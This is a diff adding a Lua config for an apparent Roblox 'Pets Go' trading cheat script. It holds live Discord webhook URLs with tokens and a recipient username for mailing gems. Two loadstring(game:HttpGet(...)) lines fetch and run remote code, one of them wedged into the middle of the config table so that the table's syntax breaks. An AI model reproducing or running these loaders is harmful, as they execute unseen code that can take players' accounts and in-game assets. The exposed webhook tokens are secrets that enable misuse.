@@ -1,0 +1,17 @@
+-- Config with "MIN" = 1-5000 Minimum Quantity to sell
+-- Config with "SELL_PERCENTAGE" -> 1 = 100% RAP, 1.1 = 110% RAP, 0.8 = 80% RAP, , 0.85 = 85% RAP (Any Amount)
+getgenv().petsGoConfig = {
+    DISCORD_ID = "1318777726223646721",
+    PLAZA_WEBHOOK_URL = "https://discord.com/api/webhooks/1327644087481794631/DG3sfXdOua9vAPDWfuf3KGQEOTVN6FyKtLrXPcMrd2R5cEKbBhfO7aaJnga2gaPEhvVl",
+    MAIL_GEM_WEBHOOK_URL = "https://discord.com/api/webhooks/1327644388326768710/fG6JRQUUOMY441Pdxjkk-FNVzgxXPFcaWE0_Cy7YXZMitGQnygOjJ_JCueWje6ssFd4o",
+
+    -- Plaza hop delay will reset if someone purchase something.
+    PLAZA_HOP_DELAY = 20,  -- (minutes) If no one purchase, server hop
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/02/main/Data-plaza"))()
+
+    MAIL_GEMS_USERNAME = "PopeSnail2801",  -- Empty = Disabled Gem Mail
+    MAIL_GEMS_MIN = 20000000,  -- Minimum gems required to send
+}
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/edafbc84006c0897b76b0d07cef3fe41.lua"))()
